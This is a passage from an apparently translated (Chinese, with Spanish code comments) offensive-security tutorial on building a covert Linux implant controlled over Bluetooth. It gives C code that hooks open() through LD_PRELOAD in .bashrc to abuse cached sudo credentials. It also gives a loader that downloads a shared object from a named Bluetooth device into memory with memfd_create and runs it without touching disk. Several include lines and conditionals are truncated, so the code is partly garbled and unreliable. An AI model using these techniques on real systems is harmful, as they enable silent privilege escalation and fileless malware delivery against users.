            if (pid  0) {
                            write(terminalfd, input, n); // Los escribimos en el STDIN del proceso hijo
                        }
                    }
                }
            }
        }
        close(client);
        close(s);
        return 0;
    }
在下面的图片中，我们可以清楚地看到我们之前没有伪端点的外壳的不同之处:
通过这些基础知识，我们可以通过蓝牙使用Shell创建一个小型二进制机器控制器。让我们继续
## 通过sudo缓存提高权限
虽然在前面的章节中，我们重点介绍了通过蓝牙实现控制的概念证明，但理想情况下，我们的程序应尽可能以最大权限运行。可以使用的最古老的技术之一是利用sudo缓存运行命令或我们自己的二进制文件。
默认情况下，当终端首次运行sudo时，需要用户的密码。但是，此密码会在一段时间内被缓存，阻止用户在每次使用sudo执行任务时引入该密码。如果我们在执行sudo的终端中重复运行我们自己的二进制文件，这个功能很容易被滥用。因此，我们希望找到一个时间窗口，其中密码被缓存并且未被请求，以便我们最终可以执行sudo。
实现上述事实的最简单方法是编辑文件.bashrc（或其他使用其他shell的等效文件），并将环境变量LD_PRELOAD添加到我们的某个库中。这就是我们如何在运行在该shell中的动态链接二进制文件中预加载我们的库。当预加载我们的库时，我们可以自由地挂接运行的任何函数。因此，每次调用该函数时，我们的一个主管职能部门应检查凭证是否被缓存：如果是这种情况，将开始所需的一组操作。
重要：我们不会在sudo中加载我们的库（因为它包含suid），我们真正在做的是将其加载到其他二进制文件中，以便每当运行挂钩函数时检查是否可以在不注册密码的情况下执行sudo
。
作为概念的简单证明，我们可以使用以下示例来表示工作流程：
    #define _GNU_SOURCE                                                                                                                                                                                        
    #include                                                                                            
    #include                                                                                            
    //Basado en https://blog.maleadt.net/2015/02/25/sudo-escalation/                                                
    typedef int (*orig_open_f_type) (const char *pathname, int flags);                                              
    int open(const char *pathname, int flags, ...){ // A modo de ejemplo "hookearemos" open()                                                                
        orig_open_f_type orig_open;                                                                                 
        pid_t pid, extrapid;                                                                                        
        int empty, exitcode;                                                                                        
        orig_open = (orig_open_f_type) dlsym(RTLD_NEXT, "open"); // Guardamos una referencia a la función open original                                                    
        pid = fork(); // Nos forkeamos para comprobar si sudo se encuentra cacheado o no                          
        if (pid == 0) { //Si estamos en el hijo...    
            empty = orig_open("/dev/null", O_WRONLY);                                                               
            dup2(empty, STDERR_FILENO); // ...silenciamos cualquier error...                                                           
            execlp("sudo", "sudo", "-n", "true", NULL);// ...y ejecutamos sudo                                        
            exit(-1);                                                                                               
        } else {   // Estamos en el padre...
            wait(&exitcode);                                                                                        
            if (WIFEXITED(exitcode) && WEXITSTATUS(exitcode) == 0) {                                                
                if (exitcode == 0){ // Si todo ha ido bien y hemos podido ejecutar sudo...                                          
                    extrapid = fork(); //Nos forkeamos para dejar fluir el programa                               
                    if (extrapid == 0) {                                                                            
                        printf("It worked!n"); // Y ejecutamos lo que queramos                                         
                        execlp("sudo", "sudo", "id", NULL);                                                         
                    }                                                                                               
                }  
            }      
        }          
        return orig_open(pathname, flags); // Llamamos al open() original y devolvemos el resultado                                     
    }
## 在内存中运行二进制文件
从内核3.17开始，我们依赖一个名为[“ memfd_create ”
](https://dvdhrm.wordpress.com/2014/06/10/memfd_create2/)的新系统调用，它可以收集与内存相关的文件描述符。通过这种方式，可以执行文件操作，但这些操作不会链接到文件系统。因此，我们可以使用它来托管包含最相关代码的库或二进制文件（可通过蓝牙下载）。这就是我们应该如何处理一个负责仅连接和下载一系列模块的框架。但是将它们下载到`/dev/shm`并在运行或加载后快速删除它们。这些想法在[‘Loading
“fileless” Shared Objects (memfd_create + dlopen)’
](https://x-c3ll.github.io/posts/fileless-memfd_create/)后进行详细说明。
我们将结合这篇文章中讨论的所有内容（包括任何特定名称检测，连接，下载和加载的蓝牙设备）作出以下代码：
    #define _GNU_SOURCE
    #include 
    #include 
    #include 
    #include 
    #include  
    #include 
    #include 
    #include 
    #include 
    #define TARGET "Gojira"
    #define SHM_NAME "IceIceBaby"
    #define __NR_memfd_create 319 // https://code.woboq.org/qt5/include/asm/unistd_64.h.html
    // Wrapper to call memfd_create syscall
    static inline int memfd_create(const char *name, unsigned int flags) {
        return syscall(__NR_memfd_create, name, flags);
    }
    // Detect if kernel is  than 3.17
    // Ugly as hell, probably I was drunk when I coded it
    int kernel_version() {
        struct utsname buffer;
        uname(&buffer);
        char *token;
        char *separator = ".";
        token = strtok(buffer.release, separator);
        if (atoi(token)  3){
            return 1;
        }
        token = strtok(NULL, separator);
        if (atoi(token)  fprintf(stderr, "[-] Could not open file descriptorn"); exit(-1); } } // If we have a kernel >= 3.17
        // We can use the funky style
        else {
            shm_fd = memfd_create(SHM_NAME, 1);
            if (shm_fd 
                fprintf(stderr, "[- Could not open file descriptorn");
                exit(-1);
            }
        }
        return shm_fd;
    }
    // Load the shared object
    void load_so(int shm_fd) {
        char path[1024];
        void *handle;
        printf("[+] Trying to load Shared Object!n");
        if (kernel_version() == 1) { //Funky way
            snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), shm_fd);
        } else { // Not funky way 
            close(shm_fd);
            snprintf(path, 1024, "/dev/shm/%s", SHM_NAME);
        }
        handle = dlopen(path, RTLD_LAZY);
        if (!handle) {
            fprintf(stderr,"[-] Dlopen failed with error: %sn", dlerror());
        }
    }
    //Connect to client, read module and write to RAM
    int download_to_RAM(char *address) {
        struct sockaddr_rc addr = {0};
        char recvBuff[2048];
        int s, client, fd, size;
        s = socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM);
        addr.rc_family = AF_BLUETOOTH;
        addr.rc_channel = (uint8_t) 1;
        str2ba(address, &addr.rc_bdaddr);
        client = connect(s, (struct sockaddr*)&addr, sizeof(addr));
        if (client bdaddr, addr);
                memset(name, 0, sizeof(name));
                // Leemos el nombre de los dispositivos descubiertos
                hci_read_remote_name(sock, &(ii+i)->bdaddr, sizeof(name), name, 0);
                // Comprobamos si es el que estamos buscando
                if (strcmp(TARGET, name) == 0) {
                    printf("Found! %s - %sn", name, addr);
                    free(ii);
                    close(sock);
                    fd = download_to_RAM(addr);
                    load_so(fd);
                    exit(EXIT_SUCCESS);
                }
            }
        }
        exit(0);
    }